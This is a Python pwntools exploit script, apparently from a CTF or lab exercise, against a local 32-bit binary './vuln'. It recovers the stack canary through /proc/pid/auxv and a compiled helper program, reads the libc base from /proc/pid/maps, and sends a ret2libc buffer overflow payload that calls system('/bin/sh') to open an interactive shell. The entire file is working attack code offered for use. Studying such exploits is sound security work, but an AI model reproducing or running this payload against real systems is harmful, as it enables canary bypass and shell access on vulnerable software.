

from pwn import *
from subprocess import check_output


def get_pid(filename):
	return check_output(["pidof",filename])

def find_atrandom(pid):
	auxv = os.popen("od -t d4 /proc/" + pid + "/auxv").read()
	for line in auxv.split('\n'):
		if " 25 " in line:
			addr = int(line.split(' ')[11])
	return addr

def find_canary(pid, atrandom):
	os.system("gcc canary.c -o canary")
	canary = os.popen("./canary " + str(pid) + " " + str(atrandom)).read()
	return canary

def find_libcbase(pid):
	with open('/proc/%s/maps' % pid) as maps: 
		for line in maps:
			if 'libc-' in line and 'r-x' in line:
				libcbase = line.split(' ')[0].split('-')
	libcbase = "0x" + libcbase[0]
	libcbase = int(libcbase, 16)
	return 	libcbase

def find_payload(libcbase, ssp, offset, ssp_offset):
	e = ELF('/lib/i386-linux-gnu/libc.so.6')

	off_system = e.symbols['system']		#offset of system
	off_exit = e.symbols['exit']			#offset of exit
	off_binsh = e.search("/bin/sh").next()	#offset of /bin/sh

	system_addr = libcbase + off_system
	exit_addr = libcbase + off_exit
	binsh_addr = libcbase + off_binsh

	buf = ""
	buf += "A"*ssp_offset	# junk
	buf += p32(ssp)
	buf += "A"*(offset-ssp_offset-4)
	buf += p32(system_addr)	# system address
	buf += p32(exit_addr)	# exit address
	buf += p32(binsh_addr)	# /bin/sh address
	return buf


if __name__ == "__main__":

	offset = 80
	canary_offset = 64
	filename = "./vuln"

	p = process(filename)
	pid = get_pid(filename).rstrip()
	addr_atrandom = find_atrandom(pid)
	canary = int(find_canary(pid, addr_atrandom), 16)

	libcbase = find_libcbase(pid)
	payload = find_payload(libcbase, canary, offset, canary_offset)
	p.sendline(payload)

	p.interactive()
	p.close()






